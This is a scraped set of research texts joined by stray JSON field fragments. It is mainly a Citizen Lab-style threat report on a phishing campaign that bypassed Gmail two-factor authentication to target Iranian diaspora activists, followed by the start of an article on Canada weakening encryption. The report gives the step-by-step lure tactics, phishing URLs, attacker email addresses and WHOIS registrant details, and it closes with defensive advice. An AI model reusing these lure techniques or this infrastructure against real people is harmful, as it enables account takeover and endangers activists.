\nFireEye\n\n\n\nhttps://www.fireeye.com/resources/pdfs/fireeye-operation-saffron-rose.pdf\n\n\n\n\nUncovering NEWSCASTER\n \nISight Partners\n\n\nhttp://www.isightpartners.com/2014/06/uncovering-newscaster-experts-cyber-threat-intelligence/\n\n\n\n\nجالب اینجاست که تشابه در ارتباطات، ابزار و تکنیک‌ها در حمله‌های مختلف، الزاما به معنای ارتباط بین این حمله‌ها و یا هماهنگی بین آن‌ها نیست. این مساله می‌تواند به این معنی باشد که مهاجمان، به صورت فعال تکنیک‌ها و روش‌های حمله را با یکدیگر به اشتراک می‌گذارند.\nاین گزارش، جامعه‌ی هدفِ این گروه را شرح می‌دهد و به صورت گسترده‌تر به تمایل این گروه به ایرانیان و به طور مشخص فعالین می‌پردازد.\nنتیجه گیری\nرمز عبور دو مرحله‌ای کاملا شما را در برابر حملات فیشینگ مصون نمی‌کند، اما در این نمونه‌ها نشان داده شد که به مهاجم هزینه، وقت و تلاش بیشتری را تحمیل می‌کند. در این نمونه، مهاجم باید دو بخش یک پازل را به دست بیاورد: رمز عبور اصلی و رمز عبور یک بار مصرف دوم. فریب باید در تمام مراحل ورود جعلی به حساب کاربری ادامه داشته باشد. این نوع از حمله نیاز به دقت و تلاش بیشتری نسبت به حمله‌های معمولی فیشینگ دارد که مهاجم ممکن است براساس آزمون و خطا در فعالیت‌های قبلی به آن رسیده باشد. علاوه بر این، حمله‌های فیشینگ از این دست باید در زمان حقیقی صورت بگیرد، چرا که رمز عبور دوم پس از مدت کوتاهی منقضی خواهد شد. سختی این نوع از حمله نشان داده است که بدون یک برنامه ریزی دقیق و منسجم، این تکنیک به نتیجه مطلوب نخواهد رسید.\nاین حمله همچنین جزییات بسیاری درباره مهاجمانی که در گزارش‌های پیشین به آن‌ها اشاره شده بود در اختیار ما قرار داده است. اول اینکه اهداف این حمله‌ها بسیار فرا‌تر از آن چیزی است که در گزارش کلیر اسکای و ترند میکرو آمده است و به دایره فعالان حوزه‌های مختلف می‌رسد. دوم اینکه مهاجمان برای انجام این حمله‌ها به مطالعه درباره هدف خود و فعالیت‌های او می‌پردازند.\nهرچند که بیش از یک دهه از اولین گزارش‌های حمله‌های زمان حقیقی به رمز عبور دوم می‌گذرد اما تا به امروز گزارش‌های محدودی از هدف قرار گرفتن فعالان سیاسی منتشر شده است. ممکن است دلیل آن نیز افزایش اهداف بالقوه باشد که به دلایل امنیتی شروع به استفاده از رمز عبور دوم برای حساب کاربری ایمیل‌های خود کرده‌اند. این مساله قوه محرکی برای مهاجمان شده است تا از روش‌هایی که خلاف کاران اقتصادی در یک دهه گذشته استفاده کرده‌اند، برای اهداف جدید استفاده کنند.\nروش‌های عملی: مهاجمان دو مرحله‌ای از آن‌ها بیزارند!\nاستفاده از رمز عبور دو مرحله‌ای\nنیرنگ‌هایی که توسط مهاجمان در این نمونه‌ها مورد استفاده قرار گرفته بود، توسط اهداف شناسایی و با ما در میان گذاشته شدند. با استفاده از رمز عبور دو مرحله‌ای برای جیمیل و هوشیاری کاربران، کاربران امن ماندند. فعال کردن رمز عبور دو مرحله‌ای برای حساب‌های کاربری، گام مهم امنیتی به شمار می‌رود. در این لینک می‌توانید لیستی از سرویس‌هایی که از رمز عبور دو مرحله‌ای پشتیبانی می‌کنند را می‌بینید. همچنین گوگل پیشنهاد می‌کند که برای امنیت بیشتر به جای استفاده از پیامک، از اپ Google Authenticator استفاده کنید.\nاگر می‌خواهید از شر حملات فیشینگ مشابه خلاص شوید نیز می‌توانید یک کلید سخت افزاری U2F Key بخرید و از آن برای ورود به حساب‌های کاربری سازگار استفاده کنید.\nیک روش ساده برای شناسایی صفحات جعلی\nزمانی که می‌خواهید به جیمیل و یا هر حساب کاربری دیگری وارد شوید، دقت کنید که همیشه آدرس صفحه باید با HTTPS شروع شود. در تصویر زیر صفحه‌ی ورود واقعی گوگل (در سمت چپ) و یک صفحه فیشینگ (در سمت راست) را مشاهده می‌کنید.\nعکس ۱۲ : اگر اچ تی تی پی را در ابتدای آدرس نمی‌بینید، احتمالا در صفحه واقعی ورود به حساب کاربری خود نیستید.\nاگر https را در ابتدای آدرس نمی‌بینید، احتمالا در صفحه واقعی ورود به حساب کاربری خود نیستید.\nبا تشکر ویژه از: قربانیان نا‌شناسی که لطف کردند و مطالب و تجربیات خود را با ما در میان گذشتند، ژیلیان یورک، همکاران ما در سیتیزن لب، مورگن مارکیز بویر، ماساشی کرت نیشیهاتا، بیل مارچک و ران دیبرت و همین طور‌گری بلوین از گوگل، جوردل بری و دو تن دیگر از دوستان و همکاران نا‌شناس.\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tPersian: برای خواندن گزارش به زبان فارسی اینجا کلیک کنید.\nArabic (via Cyber Arabs): قراءة في العربية\nMedia coverage: Associated Press, The Daily Beast, Forbes, Huffington Post, IBT, Politico, Motherboard, SC Magazine, VOA, The Hill, BoingBoing, Schneier on Security, Information Age, Radio Free Europe/ Radio Liberty\nAuthors: John Scott-Railton and Katie Kleemola \nSummary\nThis report describes an elaborate phishing campaign against targets in Iran’s diaspora, and at least one Western activist. The ongoing attacks attempt to circumvent the extra protections conferred by two-factor authentication in Gmail, and rely heavily on phone-call based phishing and “real time” login attempts by the attackers. Most of the attacks begin with a phone call from a UK phone number, with attackers speaking in either English or Farsi.\nThe attacks point to extensive knowledge of the targets’ activities, and share infrastructure and tactics with campaigns previously linked to Iranian threat actors. We have documented a growing number of these attacks, and have received reports that we cannot confirm of targets and victims of highly similar attacks, including in Iran.  The report includes extra detail to help potential targets recognize similar attacks. The report closes with some security suggestions, highlighting the importance of two-factor authentication.\n\nUpdate: Iranian Gov-Linked Media Respond to Coverage of This Report\nIranian media outlet Masregh News, which is reportedly close to Iran’s intelligence and security services, published a response to the reporting around this post. The Masregh article specifically took issue with an IB Times report that draws a connection between Citizen Lab’s report and Iran’s Revolutionary Guards. It is important to note that the Citizen Lab report does not make this attribution.\nThe Mashregh News report dismisses the connection made in the IB Times, and calls the link between this attack and previous phishing around the 2013 election “irrelevant.” The article also intimates that because Iranian media have previously reported on phishing attacks, the Iranian Government is not responsible.\n\nPart 1: Background\nWhat is Two-Factor Authentication?\nTwo-factor authentication (2FA) is an authentication tool used by many services to increase account security against password theft and phishing. The most commonly used form of 2FA is to send users a text message with a code once they have entered their password. The text message goes to a previously registered phone. When enabled, 2FA frustrates attackers who have simply stolen users passwords.\nImage 1: This diagram shows basic two-factor authentication at work. Image by Google Inc.\nImplementing 2FA raises the bar on phishing attempts: In order to work, the attacker must gain access to both the victim’s password, and the single-use code. Typically codes expire quickly, presenting an additional hurdle to an attacker.\nAttacks on 2FA: Nothing New Under the Sun\nAs researchers have observed  for at least a decade, a range of attacks are available against 2FA.  Bruce Schneier anticipated in 2005, for example, that attackers would develop real time attacks using both man-in-the-middle attacks, and attacks against devices.   The“real time” phishing against 2FA that Schneier anticipated were reported at least 9 years ago.\nToday, researchers regularly point out the rise of “real-time” 2FA  phishing, much of it in the context of online fraud.  A 2013 academic article provides a systematic overview of several of these vectors. These attacks can take the form of theft of 2FA credentials from devices (e.g. “Man in the Browser” attacks), or by using 2FA login pages. Some of the malware-based campaigns that target 2FA have been tracked for several years,  are highly involved, and involve convincing targets to install separate Android apps to capture one-time passwords.  Another category of these attacks works by exploiting phone number changes, SIM card registrations, and badly protected voicemail.\nIranian Phishing\nMany previous phishing campaigns have been described and linked to Iranian attackers. For example,  attacks against Gmail accounts have been regularly noted, including a report on the Google Security Blog (also available in Farsi here) describing a campaign that escalated before elections in 2013.  At the time, Google also linked this attack to a previous attempt to use fake SSL certificates for targeted attacks against Gmail accounts within Iran.  In many other cases, Iranian attackers have coupled phishing with other forms of malware attack (see below: Not Their First Time: Links With Other Campaigns).\nWhile attacks against 2FA are widely documented in the context of online fraud, the rise in use of 2FA by users of free online services may be leading other categories of attackers, such as political attackers, to begin developing their own versions of these attacks.\nPart 2: Three “Real Time” Attacks\nAttack 1: “The Iran” is logging in to your account!\nHow does this attack work?\nThis “real time” attack attempts to phish both the user password and the 2FA one-time code.  The attacker does this by showing fraudulent pages that simulate the Gmail 2-step login process to the victim.  The attacker collects the victim’s input, while simultaneously logging in to the real Gmail page.  The attacker’s login attempt triggers Google to send a genuine 2FA code to the victim, which the attacker then collects and enters themselves.  We have seen several versions of the attack, including one not accompanied by SMSes.\nAttack Narrative\nThis section gives a narrative of how one version of this attack unfolded. (Personally identifiable information has been redacted to protect the target’s identity.)\nStep 1: SMS from “Google” to create fear of an account compromise\nThe attack began with an early morning SMS message sent to the target. The message copied the style of Google SMS alerts and “notified” the target that there was an unexpected sign-in attempt. The sending number was unknown to the target.\nImage 2: The fake Google “sign-in attempt” SMS\nWe believe this message was an attempt to create a pressing concern on the part of the target that a personal account had been compromised.\nStep 2: Immediate follow up with “Sign-in attempt” notification\nLess than 10 minutes after receiving the first SMS, the target received an e-mail masquerading as a Gmail Log-in attempt notification. Importantly, the e-mail was carefully populated with personalized details of the target including the target’s name, e-mail, and profile picture.\nNotably the fake “Unexpected sign-in attempt” notification states that the attempt is from “The Iran.” For a target concerned about being hacked by groups in Iran, this could easily create a sense of concern.\nImage 3: The displayed message sender is also an attempt to create a lookalike for a Gmail domain.\nThe displayed message sender is also an attempt to create a lookalike for a Gmail domain.\nno-reply@support.qooqlemail.com\nWe found that domain was used in at least one other attack of this type.\nStep 3: Trick target into entering password and wait for the 2FA code\nClicking on the “Reset Password” link yields a carefully crafted phishing page. We have partially redacted the page URL to protect the privacy of the target.\nhttp://login.logins-verify[dot]com/[redacted]\nThe page is personalized for the target, and includes the target’s e-mail address and name. It includes additional code, borrowed from Google, to create the appearance that the target is viewing a genuine Google page.\nImage 4: The attacker’s goal is probably to obtain the “Current password.” Presumably, the “New password” will be ignored.\nEntering information in this page and clicking on “Change Password” leads to a second page that appears to be a 2FA code request.\nImage 5: A second page that appears to be a 2FA code request\nFor this attack to work, the attackers must actively monitor the phishing page. Once the target enters their password into the phishing site the attackers likely use the credential to attempt to log in to gmail. The attacker’s login attempt then triggers the sending of a 2FA code from real Google to the target. They then wait for the target to enter the 2FA code from Google. Once the target enters the code, the attackers are able to take control of the account and (presumably) change the credentials.\nStep 4: Keep up the pressure with fake 2FA notifications\nImage 6: Fake 2FA notifications\nIn this case, the attack failed. The target sensed something was not right and did not enter any credentials. Over the next hour, perhaps growing frustrated, the attackers sent the target a stream of fake SMS messages. These messages purported to be a Google 2FA verification code. The target received more than 10 messages in short succession. Most messages came from different numbers, all unknown to the target.\nWe suspect that these messages were an attempt to put psychological pressure on the target, and enhance the fiction that an attacker already had the target’s password. The attackers must have hoped that enough messages would trigger action. The final ruse failed, and the attack was unsuccessful.\nAttack 2: Relax, I Already Know A Lot About You\nHow does this attack work?\nThis second attack, which we tie to the same actors, has similar characteristics. In this case, the bait is slightly different, involving a phone call and a proposal. The ultimate goal, again, is to convince the target to enter both their password and 2FA code.\nAttack Narrative\nStep 1: Call up target with a ‘proposal’\nThe attack began with a morning call from a number in the UK. A male voice spoke in Farsi under the pretext of offering a potential collaboration.  The attacker mentioned that it was related to activities in which the target was involved, both on and offline. The caller, presumably one of the attackers (or a confederate), demonstrated extensive knowledge of the target’s personal hobbies and professional activities.\nAfter making several comments, which served to alarm rather than reassure the target, the unknown caller proposed a business project related to the target’s activities. The call ended with the caller promising to send the target a proposal.\nStep 2: Immediate follow up with a ‘proposal’ and a fake Google Drive link\nShortly after the phone call, the target received an email on a personal account that was not publicly used. The e-mail continued the deception, and used the same name as the caller.\nThe e-mail is written in a way that roughly mimics a Google Drive shared file notification. The body text proposes a project sweetened by the promise of tens of thousands of dollars.\nImage 7: An email written in a way that roughly mimics a Google Drive shared file notification.\nStep 3: Trick target into entering password and wait for the 2FA code\nClicking on the “Document.pdf” link leads to a fake login page for Google Drive. Again, the login is pre-populated with the e-mail and name of the target, indicating a high degree of customization.\nImage 8: A fake login page for Google Drive\nThe domain of the page (logins-verify.com) is clearly an attempt at looking official, as is the excessive subdomain (again redacted to protect the identity of the target).\nhttp://login.setting.verification.configuration.user.action.first.step.edit.check.privacy.view.document.setting.verification.configuration.user.login.logins-verify[dot]com/[redacted]\nEntering text into the login page and clicking on “View Document” yields a fake 2FA authentication page.\nAttack 3: Just open the file, I’m a journalist!\nHow does this attack work?\nThis attack is similar to Attack 2, although in these cases the attack masquerades as a request from a member of the media. The calls also come from UK numbers, one of which was shared across multiple attacks. One such attack targeted Jillian York, Director for International Freedom of Expression at the Electronic Frontier Foundation. She has agreed to allow us to name her and share additional details on the attack that targeted her. York is the only non-Iranian target we are aware of, and may have been included because her work includes extensive professional contact with Iranian advocacy groups.\nAttack Narrative\nStep 1: Early morning phone call\nJillian York of the Electronic Frontier Foundation was woken early in the morning by a phone call from a number in the UK.1 A male voice identified himself as a journalist with Reuters and began with small talk that indicated some knowledge of her activities. The connection was not good and the caller immediately rang back. He said there was something he wished to discuss and verified that he had the correct e-mail address for York.\nStep 2: Send the bait\nImmediately after the phone calls, York received an e-mail masquerading as sent from the Reuters news agency’s “Tech Dep” and promising an interview. The spoofed e-mail contains some errors, including the misspelling of “Reutures.” The e-mail is slightly more sophisticated than those seen in earlier Google Docs style phishing from the same group\nImage 10: An e-mail masquerading as sent from the Reuters news agency’s “Tech Dep” and promising an interview.\nAs with the other attacks the e-mail masquerades as a Google Docs e-mail share but is, in fact, a link to a phishing site, lightly disguised with a Google redirect.\nhttps://www.google.com/url?q=http%3A%2F%2Freuters.users.check.login.newsia[dot]my%2FDr-Check%2FAutoSecond%3FChk%3Dj5645hgfgh5gff&sa=D&sntz=1&usg=AFQjCNF7FFFdEDdao4J8bYqow6uTZDx18w\nInterestingly, the text “Reutures, Tech Dep has shared the following PDF” contains a link to the following Gmail address. The same address is present in the “reply to” of the message.\nmailto: bijan.yazdani2002@gmail.com\nOther attempts also contain e-mail addresses in the e-mail body, but we are not including them to preserve the anonymity of other targets.\nStep 3: Keep up the pressure\nThe target did not immediately click the link, and the attacker, probably anxious for his effort to pay off, called back. York prudently said that if he wished to send a message it should be included in the message body.\nStep 4: If at first you don’t succeed\nThe attacker then sent a second message, this time using another name. The message contained another fake Google Doc link. This time the attacker used a different e-mail address with a western sounding name “Alex Anderson.” The phishing link is the same as the earlier message.\nImage 11: The attacker then sent a second message, this time using another name, The message contained another fake Google Doc link.\nThe attacker followed up with another call, further attempting to persuade York to open up the document. The efforts failed, with the attacker’s tone becoming increasingly “belligerent.”\n\n“This is from my personal address! Just open it!”- The increasingly frustrated attacker on the phone\n\nIn total, the attacker called York more than 30 times over the next day. The attack had failed.\nStep 5: Other avenues\nWhile this attack was ongoing, York’s Facebook account was targeted with password reset attempts. As the attacker did not control her recovery e-mail accounts, the attempts failed.\nPart 4: The Attacker? Many Clues\nThe attacks we have reported here stand out by virtue of both the extensive effort expended by the attackers, and their seemingly detailed knowledge of the public and private activities of their targets. We have observed this campaign over several months, and note that it has undergone slight evolution.\nPhishing Infrastructure\nThe attacks share a wide range of features, and in some cases the same domain. A key feature of the domain registrations is impersonating the WHOIS for Google. For example, Attacks 1 and 2 both use the domain “logins-verify[dot]com”\nWhois for logins-verify[dot]com\nDate Checked\n2015-06-28\nRegistrant\nGoogle Inc.\nRegistrar\nOnlinenic Inc\nCreated\n2015-06-27T04:00:00+00:00\nUpdated\n2015-06-27T03:27:15+00:00\nExpires\n2016-06-27T04:00:00+00:00\nName Servers\nns1.dns-diy.net, ns2.dns-diy.net\nEmail\ngmail-aduse@google.com (a,t,r)\nName\nMarkMonitor, Inc.

Currently, the domain resolves to the following:\n\n\n\nDomain\nIP\nIP Organization\nOrg Country\n\n\nservices-mails[.]com\n134.19.181.85\nGLOBAL LAYER BV\nNL\n\n\n\nFinally, the phishing site described in Attack 3 appears, unlike the others, to be a compromised domain belonging to a Malaysian company that provides bus services in Southeast Asia.\nreuters.users.check.login.newsia.my\nE-mails\nMany, but not all of the attacks, spoofed the domains of legitimate sites. The attackers appear to be using a php mail script loaded onto compromised websites. For example, many attacks used the website of a Texas lawyer specializing in injuries during birth. We contacted the firm, and they deleted the malicious scripts and updated their site.\nIn other cases, the attackers seemed to have used lookalike domains in the reply-to, like:\nqooqlemail.com\nAlthough we were not able to confirm whether the attackers control this domain, the WHOIS for this domain may represent an interesting avenue for future research:\nRegistrant Name: Ali Mamedov\nRegistrant Organization: Private person\nRegistrant Street: versan 9, 16/7\nRegistrant City: Kemerovo\nRegistrant State/Province: other\nRegistrant Postal Code: 110374\nRegistrant Country: RU\nRegistrant Phone: +7.4927722884\nRegistrant Email: kavaliulinovich@gmail.com\nThe e-mail address:\nkavaliulinovich@gmail.com\nHas been previously associated with another potential phishing domain:\nbluehostsupport.com\nFinally, several of the messages came from e-mail accounts hosted on free mail services, like Gmail. For example:\nbijan.yazdani2002@gmail.com\nInterestingly, some of the addresses used in the phishing campaign are associated with active (although likely fraudulent) social media profiles.\n\nNot Their First Time: Links With Other Campaigns\nThe misspelling in the WHOIS record also directed us towards previous reports:\n\n\n\nThamar Reservoir: An Iranian cyber-attack campaign against targets in the Middle EastClearSky Sec\nhttp://www.clearskysec.com/wp-content/uploads/2015/06/Thamar-Reservoir-public1.pdf\n\n\nOPERATION WOOLEN-GOLDFISH: When Kittens Go Phishing\nTrend Micro\nhttp://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-operation-woolen-goldfish.pdf \n\n\n\nThe ClearSky Sec report notes other attacks described by security companies with similarities in practices used by attackers (but not always similarities in infrastructure). These include:\n\n\n\nAjax Security Team, Operation Saffron RoseFireEye\nhttps://www.fireeye.com/resources/pdfs/fireeye-operation-saffron-rose.pdf \n\n\nUncovering NEWSCASTERISight Partners\nhttp://www.isightpartners.com/2014/06/uncovering-newscaster-experts-cyber-threat-intelligence/\n\n\n\nInterestingly, the shared connections, tools, techniques and practices across threat groups do not necessarily indicate collaboration, or conclusive attribution. It may be that these threat actors actively share techniques and practices that work.\nThis report expands on what is known about the targets of interest to this group, and further indicates an interest in Iranis in the diaspora, and particularly those who are activists.\nConclusion\nTwo-factor authentication won’t eliminate phishing, but this case shows how it increases the time and effort attackers must expend. In this case, attackers had to phish two pieces of information: the password and the two-factor authentication code. The deception had to last through an entire falsified login flow. This approach required a more involved deception than a simple one-off phish, which the attackers may have learned through trial and error. Moreover, they had to phish in “real time,” given the expiration time of the two-factor authentication code. The effort involved suggests that, without serious automation, this attack technique will not scale well.\nThe attack also revealed several telling details about these attackers that complement previous reports. First, the attackers have targets that extend beyond the groups mentioned in reports by Clearsky and Trend Micro, and into activist circles. Second, these attackers have clearly conducted some detailed research into their targets’ activities, further suggesting a highly targeted attack.\nAlthough “real time” attacks against two-factor authentication have been described for at least a decade, there are few public reports of such attacks against political targets.  It may be that, as a growing number of potential targets have begun using two-factor authentication on their e-mail accounts out of a concern for their security, politically-motivated attackers are borrowing from a playbook that financial criminals have written over the past decade.\nPractical Note: Two Steps Attackers Hate!\nUse Two Factor Authentication\nThe extra deception that the attackers were forced to use in these cases was spotted by those who shared attacks with us.  By using two-factor authentication and staying vigilant, the targets stayed safer.  Implementing two-factor authentication on all of your accounts is an important security step for everyone.  Click here for a comprehensive list of two-factor authentication providers.  Google also recommends that, for increased security, you use the Google Authenticator App over the text-message based approach.  Click here for a guide to setting up the Google Authenticator App.\nIf you want to take the next step and prevent this whole class of phishing, consider investing in an inexpensive U2F Key to use with compatible online accounts.\nOne Quick Check to Spot these (more obvious) Fakes!\nWhen you are logging into Gmail or other mail services you should always see “https://www.accounts.google. com” or similar at the front of the webpage URL. Here is a real Gmail login (left) and a fake login page (right).2\nImage 12: a real Gmail login (left) and a fake login page (right).\nSome fakes won’t be so sloppy. Some attackers may get a certificate for a malicious domain, and it is possible (although difficult to do and hide) to get a fraudulent certificate for a major domain.  Still, looking to make sure the base domain is correct is a simple practice worth following.\nSpecial Thanks\nThe anonymous targets who have generously shared these materials with us; Jillian York (EFF); Citizen Lab colleagues including Morgan Marquis-Boire, Masashi Crete-Nishihata, Bill Marczak, Ron Deibert, Irene Poetranto, Adam Senft, and Sarah McKune; Gary Belvin (Google) and Justin Kosslyn (Google Ideas); Cyber Arabs; Jordan Berry, Nart Villeneuve; and two anonymous colleagues.\nThanks also to Frederic Jacobs who suggested a change to the wording of the HTTPS check text.\nFootnotes\n1 The same phone number was used in at least one other attack.\n2 The images are slightly modified for the sake of illustration.\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tAuthors: Christopher Parsons, Tamir Israel\nIntroduction\nAmerican and British officials have been warning with an increasing sense of purported urgency that their inability to decrypt communications could have serious consequences. American authorities have claimed that if they cannot demand decrypted communications from telecommunications providers then serious crimes may go unsolved. In the UK this danger is often accentuated by the threat of terrorism. In both nations, security and policing serviceswarn that increased use of encryption is causing communications to ‘go dark’ and thus be inaccessible to policing and security services. These dire warnings of the threats potentially posed by criminals and terrorists ‘going dark’ have been matched over the years with proposals that would regulate encryption or mandate backdoors into any otherwise secure system. Comparatively little has been said about Canada’s long-standing efforts to inhibit end-user encryption despite the federal government’s longstanding efforts to restrict the security provided to Canadians by encryption.\nThis article outlines some of the federal government of Canada’s successful and unsuccessful attempts to weaken cryptographic standards. It starts by explaining (in brief) what communications encryption is, why it matters, and the implications of enabling unauthorized parties to decrypt communications. With this primer out of the way, we discuss why all of Canada’s mobile telecommunications carriers agree to implement cryptographic weaknesses in their service offerings. Next, we discuss the legislation that can be used to compel telecommunications service providers to disclose decryption keys to government authorities. We then briefly note how Canada’s premier cryptologic agency, the Communications Security Establishment (CSE), successfully compromised global encryption standards. We conclude the post by arguing that though Canadian officials have not been as publicly vocal about a perceived need to undermine cryptographic standards the government of Canada nevertheless has a history of successfully weakening encryption available to and used by Canadians.\nCommunications Encryption 101\nA range of technologies help individuals keep the content of their communications private from third-parties. Third-parties include the intermediaries which are involved in transmitting a communication between the two or more individuals who are communicating with one another. To protect email, the persons who generate and receive the message might transform the text so that third-parties cannot read it. Sometimes encryption is deliberately added by the end-user. As an example Alice could use a tool called GPG to encrypt her email to Bob before she sends it. At other times, encryption could be applied automatically without the end-user intervening. An example of such an application could involve the user browsing to https://server.ca and having all the communications between the web server and web browser encrypted using a protocol called SSL/TLS. Instant message-based communications can also be encrypted such that only the sender and recipient, and not the intermediaries responsible for transiting the messages, can decode them. Instant messages can be encrypted either through user intervention (such as by using tools like OTR) or automatically by the service provider (using tools such as Apple’s Messages application).\nMost encryption techniques use random character strings called ‘keys’. Keys are employed to manipulate the message being sent so that it is unreadable to a third party. In order to facilitate encryption that is readable by an intended recipient (Bob), but not by a malicious third party (Marko), a ‘key pair’ is often used. A key pair will typically include a primary key, as well as a secondary key that is generated from the primary, based on a mathematical formula. The relationship between the primary and secondary key is what allows a user (Alice) to encrypt a message in a manner that is very difficult for anyone other than the intended recipient (Bob) to decrypt.\nThere are a range of ways to encrypt communications. For the purposes of this article, we identify just two. First, there may be a persistent key pair. In such cases, the same keys are always used to encrypt and decrypt a communication so if an unauthorized party ever gets access to a decryption key they can retroactively decrypt all of the encrypted communications in their possession. In this case, if the third-party had been copying encrypted communications between a person’s Web browser (commonly referred to as a web client or user agent) and a SSL-enabled Web server for a year then all of those encrypted communications could be decrypted retroactively and read. Second, there could be a constantly (re)generating series of session keys. In these cases, the Web client and Web server create a new, temporary, set of encryption and decryption keys each time they communicate. Those session keys are then disposed of or deleted following the end of the communication. As a result, while a malicious third-party who gains access to Bob’s secret key might be able to decrypt future communications, the party cannot retroactively decrypt historically captured communications between the Web client and Web server. This is because, assuming that the process is properly configured, it can be functionally impossible for a third-party to (re)generate the same session keys.\nCommunication encryption tools combined with anonymity tools are important, as they“provide the privacy and security necessary for the exercise of the right to freedom of opinion and expression in the digital age. Such security may be essential for the exercise of other rights, including economic rights, privacy, due process, freedom of peaceful assembly and association, and the right to life and bodily integrity.” Encryption protects individuals and their communities alike by enabling them to learn and communicate without fear of unauthorized third-parties’ surveillance. As a result, encryption secures the communicative space within which individuals develop as persons. Moreover, given the use of Internet-based communications in all elements of daily life — banking transactions, the delivery of medical records, operation of critical infrastructures, routing of sensitive business information, etc  — encryption provides protections to the vast range of communications and transactions that individuals, groups, and organizations are constantly engaged in.\nIf the encryption keys that are used to decrypt messages are accessible to unauthorized third-parties then the contents of already-captured communications can subsequently be read by those third-parties. This is a non-trivial problem given that Western security as well as intelligence agencies are known to collect and archive large volumes of encrypted communications for decryption years or decades later (Aid 2009). Moreover, if the persistent key pair or the dynamically generated session keys are accessible to the third-party in real-time then they can also decrypt communications as they take place between the communicating parties. The result is that encrypted communications are no longer private from prying eyes. Such privacy might be violated by a government authority that was legally permitted to violate the communicants’ privacy, by a person inside a company who was inappropriately or illegally accessing communications, or by criminals wanting to know what the communicants are saying to one another. Requiring parties to disclose keys in their possession is deeply problematic because it undermines the whole purpose of encryption. Disclosing keys used for persistent encryption schemes not only allows for access to a specific set of encrypted communications, but exposes all past and future communications encrypted with those keys. A key retention obligation is even worse, as it wholly obviates dynamic keys, undermining the very purpose of the protocol itself.\nAs we discuss in the following sections, the federal government of Canada has actively attempted on a number of occasions to diminish the privacy and integrity of communications encryption protocols available to Canadians. Historically such efforts have been focused on undermining the privacy that mobile providers, such as Rogers and Bell, could provide to their customers. In the past several years, however, the government has quietly turned its attention to all TSPs which operate in Canada as well as to global encryption standards.\nEncryption and Mobile Carriers in Canada\nCanadian mobile telecommunications providers are required to agree to – and implement – the Solicitor General’s Enforcement Standards (SGES). Broadly, these standards establish the conditions that mobile providers must meet in order for government agencies to successfully receive information from the providers’ networks. There are a total of twenty-two standards that compose the SGES. For this article we focus on standard twelve; for a broader discussion of the SGES see our report, “The Governance of Telecommunications Surveillance: How Opaque and Unaccountable Practices and Policies Threaten Canadians.”\nStandard twelve states, “[i]f network operators/service providers initiate encoding, compression or encryption of telecommunications traffic, law enforcement agencies require the network operators/service providers to provide intercepted communications en clair.” The annotation for this standard reads: “Law enforcement requires that any type of encryption algorithm that is initiated by the service provider must be provided to the law enforcement agency unencrypted. This would include proprietary compression algorithms that are employed in the network. This does not include end to end encryption that can be employed without the service provider’s knowledge.”\nMobile telecommunications providers have historically been compelled to decrypt or decode text messages, faxes, and voice communications which they encoded upon request by government authorities. This obligation is limited to certain types of encryption techniques – excluded are end-to-end encryption techniques, which may be implemented by the service provider but, once implemented, can be initiated by end users without the knowledge or active participation of that provider. Obviously technologies have changed since the mid-1990s and as a result the government proposed expanding the SGES’ scope of application in a spectrum auction consultation in 2012. After internal debates along with critiques from industry, who opposed expanding the SGES to non-traditional communications without authorizing legislation, the government ‘clarified’ that the updates to the SGES would apply only to communications that were historically carried over ‘circuits’ as opposed to packet-based communications (See: Parsons, 2015). This decision meant that, depending on the encryption mechanism being used, new technologies for generating and delivering SMS, MMS, fax, and voice communications would remain accessible to government authorities. This has seemingly led some telecommunications providers, such as Rogers Communications, to deliberately discuss how to weaken communications-related encryption protocols such as MIKEY-IBAKE. Moreover, discussions at the European Telecommunications Standards Institution have raised whether Canadian providers should ensure any cloud-based storage system they develop be designed with lawful interception functionality baked in (For more, see: The Governance of Telecommunications Surveillance: How Opaque and Unaccountable Practices and Policies Threaten Canadians.)\nLegislating Access to Decryption Keys\nThe government of Canada has introduced legislation which would have required all telecommunications providers to decrypt communications they encrypted, where the providers retained decryption keys (commonly referred to as ‘lawful access’ legislation). Whereas the SGES applies to mobile providers, successive iterations of lawful access legislation that have been introduced by the federal government would apply to all telecommunications service providers. Thus, the legislation affects wireline and wireless telecommunications carriers, such as Rogers and Bell, as well as other providers, such as Google, Facebook, or Twitter.\nCanada’s lawful access debate occurred over more than a decade. The salient portion of the legislative mandate for this article was reintroduced several times as Bill C-46, Bill C-51 and ultimately, in February 2012, as Bill C-30. Amongst a range of other provisions, these Bills imposed novel legal obligations that would make it easier for the state to intercept communications. Sub-sections 6(1) and (2) would have required telecommunications service providers to be capable of: intercepting communications, provide interceptions to authorized parties, offer information about the geographical sites of the communication, and comply with confidentiality or security conditions such as gag orders. Sub-section 6(5) would have required that, when multiple formats were available, telecommunications providers provide intercepted data in the format preferred by the government authorities. Each of these requirements paralleled requirements already established in the SGES.\nSub-sections 6(3) and 6(4) focused on encrypted communications; 6(3) read:\nIf an intercepted communication is encoded, compressed, encrypted or otherwise treated by a telecommunications service provider, the service provider must use the means in its control to provide the intercepted communication in the same form as it was before the communication was treated by the service provider.\nPer this section, where a telecommunications provider is legally obligated to facilitate interception of communications, it would be required to decrypt those communications upon a demand from government if it retained the decryption key. Under 6(4) a provider would not be obligated, however, to “develop or acquire decryption techniques or decryption tools.”\nWhereas the SGES imposed requirements principally on mobile providers, Bill C-30 would have applied decryption requirements on all telecommunications providers. The result is that there would have been an explicit legislative clause authorizing authorities to compel telecommunications providers to decrypt communications. The bill was not passed into law. It’s successor, Bill C-13, however includes language that arguably authorizes authorities to similarly request decryption keys.\nReceiving Royal Assent on December 9, 2014, Bill C-13 includes preservation and production powers that were identical to those included in the proposed Bill C-30. Under 487.012(1) a “peace officer or public officer may make a demand to a person in Form 5.001 requiring them to preserve computer data that is in their possession or control when the demand is made.” In order to make the demand, the peace officer or public officer must have reasonable grounds to suspect that:\n(a) an offence has been or will be committed under this or any other Act of Parliament or has been committed under a law of a foreign state;\n(b) in the case of an offence committed under a law of a foreign state, an investigation is being conducted by a person or authority with responsibility in that state for the investigation of such offences; and\n(c) the computer data is in the person’s possession or control and will assist in the investigation of the offence.\nConditions may be included as part of the demand; while these can include conditions about disclosing the reception of a demand, a broader (and left unstated in the legislation) set of conditions could be applied. Moreover, assuming that a cryptographic key is captured under the definition of “computer data” that is in a telecommunications provider’s “possession or control when the demand is made” the provider might be obliged to preserve, and subsequently disclose, the key.\nIn effect, whereas C-30 would have explicitly established decryption requirements of general 